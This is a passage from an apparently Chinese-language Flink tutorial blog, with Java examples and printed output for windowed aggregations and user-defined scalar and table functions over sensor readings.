class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/4 12:47 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableTest5_TimeAndWindow</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 创建环境</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 读入文件数据，得到DataStream</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 转换成POJO</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;SensorReading&gt;(Time.seconds(<span class="number">2</span>)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(SensorReading element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 将流转换成表，定义时间特性</span></span><br><span class="line">    <span class="comment">//        Table dataTable = tableEnv.fromDataStream(dataStream, &quot;id, timestamp as ts, temperature as temp, pt.proctime&quot;);</span></span><br><span class="line">    Table dataTable = tableEnv.fromDataStream(dataStream, <span class="string">&quot;id, timestamp as ts, temperature as temp, rt.rowtime&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//        dataTable.printSchema();</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//        tableEnv.toAppendStream(dataTable,Row.class).print();</span></span><br><span class="line"></span><br><span class="line">    tableEnv.createTemporaryView(<span class="string">&quot;sensor&quot;</span>, dataTable);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 窗口操作</span></span><br><span class="line">    <span class="comment">// 5.1 Group Window</span></span><br><span class="line">    <span class="comment">// table API</span></span><br><span class="line">    Table resultTable = dataTable.window(Tumble.over(<span class="string">&quot;10.seconds&quot;</span>).on(<span class="string">&quot;rt&quot;</span>).as(<span class="string">&quot;tw&quot;</span>))</span><br><span class="line">      .groupBy(<span class="string">&quot;id, tw&quot;</span>)</span><br><span class="line">      .select(<span class="string">&quot;id, id.count, temp.avg, tw.end&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SQL</span></span><br><span class="line">    Table resultSqlTable = tableEnv.sqlQuery(<span class="string">&quot;select id, count(id) as cnt, avg(temp) as avgTemp, tumble_end(rt, interval &#x27;10&#x27; second) &quot;</span> +</span><br><span class="line">                                             <span class="string">&quot;from sensor group by id, tumble(rt, interval &#x27;10&#x27; second)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5.2 Over Window</span></span><br><span class="line">    <span class="comment">// table API</span></span><br><span class="line">    Table overResult = dataTable.window(Over.partitionBy(<span class="string">&quot;id&quot;</span>).orderBy(<span class="string">&quot;rt&quot;</span>).preceding(<span class="string">&quot;2.rows&quot;</span>).as(<span class="string">&quot;ow&quot;</span>))</span><br><span class="line">      .select(<span class="string">&quot;id, rt, id.count over ow, temp.avg over ow&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SQL</span></span><br><span class="line">    Table overSqlResult = tableEnv.sqlQuery(<span class="string">&quot;select id, rt, count(id) over ow, avg(temp) over ow &quot;</span> +</span><br><span class="line">                                            <span class="string">&quot; from sensor &quot;</span> +</span><br><span class="line">                                            <span class="string">&quot; window ow as (partition by id order by rt rows between 2 preceding and current row)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//        dataTable.printSchema();</span></span><br><span class="line">    <span class="comment">//        tableEnv.toAppendStream(resultTable, Row.class).print(&quot;result&quot;);</span></span><br><span class="line">    <span class="comment">//        tableEnv.toRetractStream(resultSqlTable, Row.class).print(&quot;sql&quot;);</span></span><br><span class="line">    tableEnv.toAppendStream(overResult, Row.class).print(<span class="string">&quot;result&quot;</span>);</span><br><span class="line">    tableEnv.toRetractStream(overSqlResult, Row.class).print(<span class="string">&quot;sql&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出:</p><p><em>因为</em><code>_partition by id order by rt rows between 2 preceding and current row_</code><em>，所以最后2次关于</em><code>_sensor_1_</code><em>的输出的</em><code>_count(id)_</code><em>都是3,但是计算出来的平均值不一样。（前者计算倒数3条sensor_1的数据，后者计算最后最新的3条sensor_1数据的平均值）</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,2019-01-17T09:43:19,1,35.8</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,2019-01-17T09:43:19,1,35.8)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_6,2019-01-17T09:43:21,1,15.4</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_6,2019-01-17T09:43:21,1,15.4)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_7,2019-01-17T09:43:22,1,6.7</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_7,2019-01-17T09:43:22,1,6.7)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_10,2019-01-17T09:43:25,1,38.1</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_10,2019-01-17T09:43:25,1,38.1)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,2019-01-17T09:43:27,2,36.05</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,2019-01-17T09:43:27,2,36.05)</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,2019-01-17T09:43:29,3,34.96666666666666)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,2019-01-17T09:43:29,3,34.96666666666666</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,2019-01-17T09:43:32,3,35.4</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,2019-01-17T09:43:32,3,35.4)</span></span><br></pre></td></tr></table></figure><h3 id="函数-Functions"><a href="#函数-Functions" class="headerlink" title="函数(Functions)"></a>函数(Functions)</h3><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106482550">Flink-函数 | 用户自定义函数（UDF）标量函数 | 表函数 | 聚合函数 | 表聚合函数</a></p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200601214323293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=WO55U&originHeight=394&originWidth=703&originalType=binary&ratio=1&status=done&style=none"></p><p><img src="https://img-blog.csdnimg.cn/2020060121433777.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=mcRhZ&originHeight=379&originWidth=694&originalType=binary&ratio=1&status=done&style=none"></p><h4 id="用户自定义函数-UDF"><a href="#用户自定义函数-UDF" class="headerlink" title="用户自定义函数(UDF)"></a>用户自定义函数(UDF)</h4><ul><li> 用户定义函数（User-defined Functions，UDF）是一个重要的特性，它们显著地扩展了查询的表达能力<br><em>一些系统内置函数无法解决的需求，我们可以用UDF来自定义实现</em> </li><li> <strong>在大多数情况下，用户定义的函数必须先注册，然后才能在查询中使用</strong> </li><li> 函数通过调用 <code>registerFunction()</code> 方法在 TableEnvironment 中注册。当用户定义的函数被注册时，它被插入到 TableEnvironment 的函数目录中，这样Table API 或 SQL 解析器就可以识别并正确地解释它 </li></ul><h5 id="标量函数-Scalar-Functions"><a href="#标量函数-Scalar-Functions" class="headerlink" title="标量函数(Scalar Functions)"></a>标量函数(Scalar Functions)</h5><p><strong>Scalar Funcion类似于map，一对一</strong></p><p><strong>Table Function类似flatMap，一对多</strong></p><hr><ul><li> 用户定义的标量函数，可以将0、1或多个标量值，映射到新的标量值 </li><li> 为了定义标量函数，必须在 org.apache.flink.table.functions 中扩展基类Scalar Function，并实现（一个或多个）求值（eval）方法 </li><li> <strong>标量函数的行为由求值方法决定，求值方法必须public公开声明并命名为 eval</strong>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">HashCode</span> <span class="keyword">extends</span> <span class="title">ScalarFunction</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> factor = <span class="number">13</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">HashCode</span><span class="params">(<span class="keyword">int</span> factor)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.factor = factor;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">eval</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> id.hashCode() * <span class="number">13</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h6 id="测试代码-11"><a href="#测试代码-11" class="headerlink" title="测试代码"></a>测试代码</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi.udf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.functions.ScalarFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.types.Row;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/4 3:28 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UdfTest1_ScalarFunction</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 创建执行环境</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// 并行度设置为1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建Table执行环境</span></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 读取数据</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 转换成POJO</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 将流转换为表</span></span><br><span class="line">    Table sensorTable = tableEnv.fromDataStream(dataStream, <span class="string">&quot;id,timestamp as ts,temperature&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 自定义标量函数，实现求id的hash值</span></span><br><span class="line">    HashCode hashCode = <span class="keyword">new</span> HashCode(<span class="number">23</span>);</span><br><span class="line">    <span class="comment">// 注册UDF</span></span><br><span class="line">    tableEnv.registerFunction(<span class="string">&quot;hashCode&quot;</span>, hashCode);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.1 table API</span></span><br><span class="line">    Table resultTable = sensorTable.select(<span class="string">&quot;id, ts, hashCode(id)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.2 SQL</span></span><br><span class="line">    tableEnv.createTemporaryView(<span class="string">&quot;sensor&quot;</span>, sensorTable);</span><br><span class="line">    Table resultSqlTable = tableEnv.sqlQuery(<span class="string">&quot;select id, ts, hashCode(id) from sensor&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印输出</span></span><br><span class="line">    tableEnv.toAppendStream(resultTable, Row.class).print();</span><br><span class="line">    tableEnv.toAppendStream(resultSqlTable, Row.class).print();</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">HashCode</span> <span class="keyword">extends</span> <span class="title">ScalarFunction</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> factor = <span class="number">13</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HashCode</span><span class="params">(<span class="keyword">int</span> factor)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.factor = factor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">eval</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> id.hashCode() * <span class="number">13</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,-772373508</span><br><span class="line">sensor_1,1547718199,-772373508</span><br><span class="line">sensor_6,1547718201,-772373443</span><br><span class="line">sensor_6,1547718201,-772373443</span><br><span class="line">sensor_7,1547718202,-772373430</span><br><span class="line">sensor_7,1547718202,-772373430</span><br><span class="line">sensor_10,1547718205,1826225652</span><br><span class="line">sensor_10,1547718205,1826225652</span><br><span class="line">sensor_1,1547718207,-772373508</span><br><span class="line">sensor_1,1547718207,-772373508</span><br><span class="line">sensor_1,1547718209,-772373508</span><br><span class="line">sensor_1,1547718209,-772373508</span><br><span class="line">sensor_1,1547718212,-772373508</span><br><span class="line">sensor_1,1547718212,-772373508</span><br></pre></td></tr></table></figure><h5 id="表函数-Table-Fcuntions"><a href="#表函数-Table-Fcuntions" class="headerlink" title="表函数(Table Fcuntions)"></a>表函数(Table Fcuntions)</h5><p><strong>Scalar Funcion类似于map，一对一</strong></p><p><strong>Table Function类似flatMap，一对多</strong></p><hr><ul><li> 用户定义的表函数，也可以将0、1或多个标量值作为输入参数；<strong>与标量函数不同的是，它可以返回任意数量的行作为输出，而不是单个值</strong> </li><li> 为了定义一个表函数，必须扩展 org.apache.flink.table.functions 中的基类 TableFunction 并实现（一个或多个）求值方法 </li><li> <strong>表函数的行为由其求值方法决定，求值方法必须是 public 的，并命名为 eval</strong>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Split</span> <span class="keyword">extends</span> <span class="title">TableFunction</span>&lt;<span class="title">Tuple2</span>&lt;<span class="title">String</span>, <span class="title">Integer</span>&gt;&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 定义属性，分隔符</span></span><br><span class="line">  <span class="keyword">private</span> String separator = <span class="string">&quot;,&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Split</span><span class="params">(String separator)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.separator = separator;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eval</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (String s : str.split(separator)) &#123;</span><br><span class="line">      collect(<span class="keyword">new</span> Tuple2&lt;&gt;(s, s.length()));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h6 id="测试代码-12"><a href="#测试代码-12" class="headerlink" title="测试代码"></a>测试代码</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi.udf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.functions.TableFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.types.Row;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/4 3:58 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UdfTest2_TableFunction</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 创建执行环境</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// 并行度设置为1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建Table执行环境</span></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 读取数据</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 转换成POJO</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 将流转换为表</span></span><br><span class="line">    Table sensorTable = tableEnv.fromDataStream(dataStream, <span class="string">&quot;id,timestamp as ts,temperature&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 自定义表函数，实现将id拆分，并输出（word, length）</span></span><br><span class="line">    Split split = <span class="keyword">new</span> Split(<span class="string">&quot;_&quot;</span>);</span><br><span class="line">    <span class="comment">// 需要在环境中注册UDF</span></span><br><span class="line">    tableEnv.registerFunction(<span class="string">&quot;split&quot;</span>, split);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.1 table API</span></span><br><span class="line">    Table resultTable = sensorTable</span><br><span class="line">      .joinLateral(<span class="string">&quot;split(id) as (word, length)&quot;</span>)</span><br><span class="line">      .select(<span class="string">&quot;id, ts, word, length&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.2 SQL</span></span><br><span class="line">    tableEnv.createTemporaryView(<span class="string">&quot;sensor&quot;</span>, sensorTable);</span><br><span class="line">    Table resultSqlTable = tableEnv.sqlQuery(<span class="string">&quot;select id, ts, word, length &quot;</span> +</span><br><span class="line">                                             <span class="string">&quot; from sensor, lateral table(split(id)) as splitid(word, length)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印输出</span></span><br><span class="line">    tableEnv.toAppendStream(resultTable, Row.class).print(<span class="string">&quot;result&quot;</span>);</span><br><span class="line">    tableEnv.toAppendStream(resultSqlTable, Row.class).print(<span class="string">&quot;sql&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义 Table Function</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Split</span> <span class="keyword">extends</span> <span class="title">TableFunction</span>&lt;<span class="title">Tuple2</span>&lt;<span class="title">String</span>, <span class="title">Integer</span>&gt;&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义属性，分隔符</span></span><br><span class="line">    <span class="keyword">private</span> String separator = <span class="string">&quot;,&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Split</span><span class="params">(String separator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.separator = separator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eval</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">for</span> (String s : str.split(separator)) &#123;</span><br><span class="line">        collect(<span class="keyword">new</span> Tuple2&lt;&gt;(s, s.length()));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,1547718199,sensor,6</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,1547718199,1,1</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_1,1547718199,sensor,6</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_1,1547718199,1,1</span></span><br><span class="line"><span 